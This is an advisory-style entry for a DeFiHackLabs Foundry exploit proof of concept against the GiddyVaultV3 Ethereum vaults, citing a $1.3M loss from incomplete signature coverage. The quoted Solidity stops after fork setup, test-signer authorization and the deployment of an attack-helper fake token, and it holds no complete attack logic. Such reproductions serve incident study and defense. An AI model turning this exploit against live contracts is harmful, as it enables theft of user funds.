# [?] GiddyVaultV3 - Incomplete Signature Coverage

## Summary
Severity: Unknown
Chain: Ethereum
Component: giddyvaultv3_compound_auth
Published: 2026-04-23
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/giddyvaultv3_compound_auth_exp.sol
Type: defi-exploit-poc

## Details
Lost: $1.3M

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 24_942_491;
        vm.createSelectFork("mainnet", forkBlock);

        attacker = ATTACKER;
        fundingToken = YB_TBTC_GAUGE;
        multiAssetLog = true;
        _addFundingToken(YB_TBTC_GAUGE);
        _addFundingToken(YB_CBBTC_GAUGE);
        _addFundingToken(YB_WBTC_GAUGE);

        // Test setup creates valid Giddy signatures without embedding historical router calldata.
        authorizeTestSigner(STRATEGY_TBTC);
        authorizeTestSigner(STRATEGY_CBBTC);
        authorizeTestSigner(STRATEGY_WBTC);

        vm.label(ATTACKER, "Attacker");
        vm.label(VAULT_TBTC, "Giddy YieldBasis tBTC Vault");
        vm.label(VAULT_CBBTC, "Giddy YieldBasis cbBTC Vault");
        vm.label(VAULT_WBTC, "Giddy YieldBasis WBTC V2 Vault");
        vm.label(STRATEGY_TBTC, "Giddy tBTC Strategy");
        vm.label(STRATEGY_CBBTC, "Giddy cbBTC Strategy");
        vm.label(STRATEGY_WBTC, "Giddy WBTC Strategy");
        vm.label(YB_TBTC_GAUGE, "g(yb-tBTC)");
        vm.label(YB_CBBTC_GAUGE, "g(yb-cbBTC)");
        vm.label(YB_WBTC_GAUGE, "g(yb-WBTC)");
        vm.label(vm.addr(TEST_SIGNER_KEY), "Local Authorized Signer");
    }

    function testExploit() public balanceLog {
        vm.startPrank(ATTACKER);
        AttackHelper helper = new AttackHelper();
        address helperAddress = address(helper);
        vm.label(helperAddress, "Attack Helper / Fake Token");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-04/giddyvaultv3_compound_auth_exp.sol_
